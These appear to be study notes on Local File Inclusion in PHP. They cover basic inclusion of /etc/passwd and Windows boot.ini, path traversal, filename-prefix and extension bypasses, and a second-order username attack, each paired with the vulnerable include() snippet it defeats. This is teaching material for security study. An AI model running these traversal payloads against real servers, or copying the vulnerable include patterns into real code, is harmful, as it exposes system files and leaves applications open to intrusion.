## Basic LFI
URL has es.php for the language parameter

```URL
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
- /etc/passwd on Linux
- C:\Windows\boot.ini on Windows


## Path Traversal
The above example works for this code:
```php
include($_GET['language']);
```

However, many developers prepend a string to the language parameter,
```php
include("./languages/" . $_GET['language']);
```
- So, if we type /etc/passwd, it would be ./languages//etc/passwd which does not exist.

Solution:
```
../../../../etc/passwd
```


## Filename Prefix
Developers will also use a prefix, for example
```php
include("lang_" . $_GET['language']);
```
- If we use ../../../etc/passwd, then the final string would be lang_../../../etc/passwd

Solution:
```
/../../../etc/passwd
```
- Prepend a forward slash to make lang_ be treated as a directory


## Appended Extensions
```php
include($_GET['language'] . ".php");
```
- If we use /etc/passwd, then it would be /etc/passwd.php, which does not exist.


## Second-Order Attacks
If we are allowed to download our avatar from /profile/$username/avatar.png, then we can change our username to ../../../etc/passwd and grab it instead of our avatar
